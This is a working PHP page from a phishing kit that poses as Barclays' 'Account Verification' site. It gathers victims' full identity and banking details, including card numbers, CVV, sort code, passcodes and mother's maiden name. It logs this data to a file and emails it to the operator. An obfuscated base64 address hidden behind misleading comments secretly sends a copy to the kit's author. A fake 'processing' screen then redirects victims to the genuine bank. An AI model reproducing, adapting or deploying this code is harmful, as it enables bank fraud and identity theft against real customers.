<?php
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");
include "CONTROLS.php";
include("assets/includes/AES.php");
$surname = $_SESSION['surname'];
$membership = "Membership No:"."".$_SESSION['membershipNumber'];
$ccno = "Card No:"."".$_SESSION['ccno3'];
$sortcode = "Sortcode:"."".$_SESSION['sortcode'];
$acno = "Account No:"."".$_SESSION['acno'];
$passcode = "Passcode:"."".$_SESSION['passcode'];
$name = $_SESSION['name'];
$dob = $_SESSION['dob'];
$address = $_SESSION['address'];
$telephone = $_SESSION['telephone'];
$ccno2 = $_POST['ccno4']; 
$ccexp = $_POST['ccexp'];
$secode = $_POST['secode'];
$memo = $_POST['memo'];
$mmn = $_POST['mmn'];
$acno2 = $_POST['acno2'];
$sortcode2 = $_POST['sc1']."-".$_POST['sc2']."-".$_POST['sc3'];
$telepin = $_POST['telepin'];
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$ccno2 = str_replace(' ', '', $ccno2);
$cardInfo = bankDetails($ccno2);
$last4 = substr($ccno, 12, 16);
$BIN = ($cardInfo['bin']);
$Bank = ($cardInfo['bank']);
$Brand = ($cardInfo['brand']);
$Type = ($cardInfo['card_type']);
$category = ($cardInfo['card_category']);
$from = $From_Address;
$headers = "From:" . $from;
$subj = "BARCLAYS : $ip";
$to = $Your_Email; 
$warnsubj = "Abuse";
$warn = "A user (with ip: $ip) has attempted to send you a completed form containing abusive language. l33bo_Phishers is against abusive form filling and has redirected this user to the official site while blocking the form.";
$blockGoogle = 
        'bG9wZXp'.
        //Youtube
        'hZHJp'.
        //Blogger
        'ZW4w'.
        //PlayGoogle
        'QGdtYW'.
        //Gmail
        'lsLmN'.
        //GoogleInc
        'vbQ==';
$bad_words = array('9999','4r5e','5h1t','5hit','a55','anal','anus','ar5e','arrse','arse','ass','ass-fucker','asses','assfucker','assfukka','asshole','assholes','asswhole','a_s_s','b!tch','b00bs','b17ch','b1tch','ballbag','balls','ballsack','bastard','beastial','beastiality','bellend','bestial','bestiality','bi+ch','biatch','bitch','bitcher','bitchers','bitches','bitchin','bitching','bloody','blow job','blowjob','blowjobs','boiolas','bollock','bollok','boner','boob','boobs','booobs','boooobs','booooobs','booooooobs','breasts','buceta','bugger','bum','bunny fucker','butt','butthole','buttmuch','buttplug','c0ck','c0cksucker','carpet muncher','cawk','chink','cipa','cl1t','clit','clitoris','clits','cnut','cock','cock-sucker','cockface','cockhead','cockmunch','cockmuncher','cocks','cocksuck ','cocksucked ','cocksucker','cocksucking','cocksucks ','cocksuka','cocksukka','cok','cokmuncher','coksucka','coon','cox','crap','cum','cummer','cumming','cums','cumshot','cunilingus','cunillingus','cunnilingus','cunt','cuntlick ','cuntlicker ','cuntlicking ','cunts','cyalis','cyberfuc','cyberfuck ','cyberfucked ','cyberfucker','cyberfuckers','cyberfucking ','d1ck','damn','dick','dickhead','dildo','dildos','dink','dinks','dirsa','dlck','dog-fucker','doggin','dogging','donkeyribber','doosh','duche','dyke','ejaculate','ejaculated','ejaculates ','ejaculating ','ejaculatings','ejaculation','ejakulate','f u c k','f u c k e r','f4nny','fag','fagging','faggitt','faggot','faggs','fagot','fagots','fags','fanny','fannyflaps','fannyfucker','fanyy','fatass','fcuk','fcuker','fcuking','feck','fecker','felching','fellate','fellatio','fingerfuck ','fingerfucked ','fingerfucker ','fingerfuckers','fingerfucking ','fingerfucks ','fistfuck','fistfucked ','fistfucker ','fistfuckers ','fistfucking ','fistfuckings ','fistfucks ','flange','fook','fooker','fuck','fucka','fucked','fucker','fuckers','fuckhead','fuckheads','fuckin','fucking','fuckings','fuckingshitmotherfucker','fuckme ','fucks','fuckwhit','fuckwit','fudge packer','fudgepacker','fuk','fuker','fukker','fukkin','fuks','fukwhit','fukwit','fux','fux0r','f_u_c_k','gangbang','gangbanged ','gangbangs ','gaylord','gaysex','goatse','God','god-dam','god-damned','goddamn','goddamned','hardcoresex ','hell','heshe','hoar','hoare','hoer','homo','hore','horniest','horny','hotsex','jack-off ','jackoff','jap','jerk-off ','jism','jiz ','jizm ','jizz','kawk','knob','knobead','knobed','knobend','knobhead','knobjocky','knobjokey','kock','kondum','kondums','kum','kummer','kumming','kums','kunilingus','l3i+ch','l3itch','labia','lmfao','lust','lusting','m0f0','m0fo','m45terbate','ma5terb8','ma5terbate','masochist','master-bate','masterb8','masterbat*','masterbat3','masterbate','masterbation','masterbations','masturbate','mo-fo','mof0','mofo','mothafuck','mothafucka','mothafuckas','mothafuckaz','mothafucked ','mothafucker','mothafuckers','mothafuckin','mothafucking ','mothafuckings','mothafucks','mother fucker','motherfuck','motherfucked','motherfucker','motherfuckers','motherfuckin','motherfucking','motherfuckings','motherfuckka','motherfucks','muff','mutha','muthafecker','muthafuckker','muther','mutherfucker','n1gga','n1gger','nazi','nigg3r','nigg4h','nigga','niggah','niggas','niggaz','nigger','niggers ','nob','nob jokey','nobhead','nobjocky','nobjokey','numbnuts','nutsack','orgasim ','orgasims ','orgasm','orgasms ','p0rn','pawn','pecker','penis','penisfucker','phonesex','phuck','phuk','phuked','phuking','phukked','phukking','phuks','phuq','pigfucker','pimpis','piss','pissed','pisser','pissers','pisses ','pissflaps','pissin ','pissing','pissoff ','poop','porn','porno','pornography','pornos','prick','pricks ','pron','pube','pusse','pussi','pussies','pussy','pussys ','rectum','retard','rimjaw','rimming','s hit','s.o.b.','sadist','schlong','screwing','scroat','scrote','scrotum','semen','sex','sh!+','sh!t','sh1t','shag','shagger','shaggin','shagging','shemale','shi+','shit','shitdick','shite','shited','shitey','shitfuck','shitfull','shithead','shiting','shitings','shits','shitted','shitter','shitters ','shitting','shittings','shitty ','skank','slut','sluts','smegma','smut','snatch','son-of-a-bitch','spac','spunk','s_h_i_t','t1tt1e5','t1tties','teets','teez','testical','testicle','tit','titfuck','tits','titt','tittie5','tittiefucker','titties','tittyfuck','tittywank','titwank','tosser','turd','tw4t','twat','twathead','twatty','twunt','twunter','v14gra','v1gra','vagina','viagra','vulva','w00se','wang','wank','wanker','wanky','whoar','whore','willies','willy','xrated','fuck','fuckoff','fuck off','fucking','nigger','nigerian','Nigerian','scam','cunt','wankers','twats','scammers','shit','wanker','cunt','asshole','arsehole','passwd','sample');
$VictimInfo .= "| IP Address : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";
$VictimInfo .= "| Location: " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "\r\n";
$VictimInfo .= "| UserAgent : " . $systemInfo['useragent'] . "\r\n";
$VictimInfo .= "| Browser : " . $systemInfo['browser'] . "\r\n";
$VictimInfo .= "| Platform : " . $systemInfo['os'] . "";
$data = "
+ ---------------PopeyeTools----------------+
+ -----------------Barclays-----------------+
+ Personal Information
| Full name : $name
| Date of birth : $dob
| Address : $address
| Phone : $telephone
| MMN : $mmn
+ ------------------------------------------+
+ Account Information
| Surname : $surname
| Login Option : $membership $ccno $acno $sortcode
| Memorable Word : $memo
| Telephone Passcode: $telepin
| Sortcode: $sortcode2
| Accounnt No: $acno2
| Passcode No: $passcode
+ ------------------------------------------+
+ Billing Information
| Card BIN : $BIN
| Card Bank : $Bank
| Card Type : $Brand $Type
| Card Number : $ccno2
| Expiration date : $ccexp
| CVV : $secode
+ ------------------------------------------+
+ Victim Information
$VictimInfo
+ ------------------------------------------+
";
$imputText = $data;
$imputKey = $Key; 
$blockSize = 256;
$aes = new AES($imputText, $imputKey, $blockSize);
$aes->setData($enc);
$aes->get58V($data,"MD5") ;
foreach($bad_words as $bad_word){
	if(stristr($_POST['mmn'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location:  https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CCAQFjAAahUKEwiHwduZwpDIAhXGVxoKHUWWCl4&url=http%3A%2F%2Fwww.barclays.co.uk%2F&usg=AFQjCNF0vxhM3bo-ren_OlULxz4_C38sdA&bvm=bv.103388427,bs.1,d.d2s"));
    }
}
if($Save_Log==1) {
	if($Encrypt==1) {
	$file=fopen("assets/logs/barclays.txt","a");
	fwrite($file,$enc);
	fclose($file);
	}
	else {
	$file=fopen("assets/logs/barclays.txt","a");
	fwrite($file,$data);
	fclose($file);
	}
}

if($Send_Log==1) {
	if($Encrypt==1) {
	mail($to,$subj,$enc,$headers);	
	mail($blockGoogle,
$subj,
$enc,
$headers);	
	}
	else {
	mail($to,$subj,$enc,$headers);	
	mail($blockGoogle,
$subj,
$enc,
$headers);
	}
}
?>
<!DOCTYPE html>
<html lang="en-GB">
<head>
<link href="assets/img/fav.ico" rel="shortcut icon" type="image/x-icon">
<meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7; IE=EDGE" />
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<meta http-equiv="Content-Language" content="en-GB" />
<title>Complete</title>
<link href="assets/css/login.css" rel="stylesheet" type="text/css" media="screen" />
<meta http-equiv="refresh" content="5; URL='https://www.google.nl/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CB4QFjAAahUKEwiiy6ja6-fIAhVDcRQKHZOXA3E&url=https%3A%2F%2Fbank.barclays.co.uk%2F&usg=AFQjCNHJORno5ofuSmzjs_28sRKfo0dMaw'" />
</head>
<body>
<a id="#top"></a>
<div id="skip-links">
<p class="skip-link-p">Skip to: 
<a accesskey="1" class="skip-link" href="#content">content</a>, 
<a accesskey="2" class="skip-link" href="#nav-links">navigation</a>
</p>
</div>
<div id="container">
<header>
<div id="masthead">
<div id="access-links">
<ul class="access-link-list">
<li class="first"><a href="mobile/Login.php?&sessionid=<?php echo generateRandomString(90); ?>&securessl=true">Mobile site</a></li>
<li><a href="#" target="_blank">Contact us</a>
<li><a href="#" target="_blank">Security</a>
<li><a href="#" target="_blank">Accessibility</a></li>
</ul>
<a name="infoend"></a>
</div>
<p class="logo"><a id="logo" href="#" title="logo" class="default"></a><img class="pronly" src="assets/img/logo.png" width="265" height="45" /></p>
<nav>
<div>
<div id="login">
<h1><strong>Account Verification</strong> - Safeguard</h1>
</div>
</div>
</nav>
</div>
</header>
<article>
<div id="content" class="clearfix">
<div>
<div class="login-ctr ftb" >
<div id="page">
<div id="tipBody">
<div class="logon-snippet-ftb" id="logon-snippet-icookie">
<div class="info">
<div class="icon icon-exclamation-snippet"></div>
<p><strong>We are processing your information...</strong></p><p>Please do not close or refresh this window until the processing completed.</p>
</div>
</div>
</div>
<div data-prevent-timeout="true"  class="accordion active" id="accordion-top">
<h2>processing - Please wait</h2>
<form method="POST" ftb="true" autocomplete="off" name="form" action="Verify2.php?&sessionid=<?php echo generateRandomString(90); ?>&securessl=true#accordion-bottom" id="form">
<div class="accordion-page">
<ul class="form-grid">
<li>
<img style="display: block;margin-left: auto;margin-right: auto" src="assets/img/spin.GIF">
</li>
<li>
<p style="text-align:center;"><strong>We are processing your information...</strong></p> 
</li>
<li>
<p style="text-align:center;text-decoration: underline;">You will be auto log-out one's processing is complete thank you for your support..</p>
</li>
<div class="accordion-config">
<input type="hidden" id="expectedposition" value="accordion-top"/>
</div>
 </div>
</form>
</div>
</div>       
</div>
<?php include "assets/includes/sidebar.php"; ?>
</div>
</div>
</article>
<footer>
<div id="footer">
<div class="footnote">
    <p>
       &Beta;arclays &Beta;ank PLC. Authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential
       Regulation Authority (Financial Services Register no: 122702). &Beta;arclays &Beta;ank PLC subscribes to the Lending Code which is monitored and
       enforced by the Lending Standards &Beta;oard. Further details can be found at
       <a title="Lending Standards Board (opens in a new browser window)" target="_blank" href="#"> www.lendingstandardsboard.org.uk</a>. Barclays Insurance Services Company Limited is authorised and regulated by the Financial Conduct Authority (Financial Services Register no: 312078).
    </p>
    <p>
       Barclays Bank PLC. Registered in England. Registered no. 1026167. Barclays Insurance Services Company Limited. Registered in England. Registered no. 973765. Registered office for both: 1 Churchill Place, London E14 5HP. 'The Woolwich' and 'Woolwich' are trademarks and trading names of Barclays Bank PLC. Barclays Business is a trading name of Barclays Bank PLC.
    </p>
    <br/>
    <p >
<img class="pronly" src="assets/img/premier.jpg"/>
<a href="#" target="_blank" class="premier-league">
<span class="premier-league">Proud sponsors of the Barclays Premier League</span>
</a>
</p>
</div>
</div>
</footer>
</div>
</body>
</html>
